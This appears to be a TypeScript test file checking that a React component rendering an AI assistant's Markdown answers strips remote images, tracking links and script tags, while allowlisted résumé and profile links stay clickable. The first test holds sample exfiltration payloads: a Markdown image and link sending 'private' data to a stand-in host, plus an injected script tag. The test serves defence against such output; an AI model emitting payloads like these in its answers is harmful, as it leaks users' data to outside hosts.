import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { AssistantMarkdown } from "../src/components/AssistantMarkdown.tsx";

describe("回答 Markdown 的外传与脚本防护", () => {
  it("攻击正文不能生成远程图片、追踪链接或可执行 HTML", () => {
    const text = [
      "![报告](https://example.invalid/collect?data=private)",
      "[校验](https://example.invalid/collect?data=private)",
      '<script>alert("injected")</script>',
    ].join("\n\n");
    const html = renderToStaticMarkup(createElement(AssistantMarkdown, { text }));
    assert.doesNotMatch(html, /<img|<link|<a\s|<script|example\.invalid/);
    assert.match(html, /校验/);
  });

  it("合法简历下载和档案主页仍可点击", () => {
    const html = renderToStaticMarkup(createElement(AssistantMarkdown, {
      text: "[下载](/resume/example.pdf) [主页](https://github.com/example)",
      allowedLinks: ["/resume/example.pdf", "https://github.com/example"],
    }));
    assert.match(html, /href="\/resume\/example\.pdf"/);
    assert.match(html, /href="https:\/\/github.com\/example"/);
    assert.match(html, /rel="noopener noreferrer"/);
  });
});
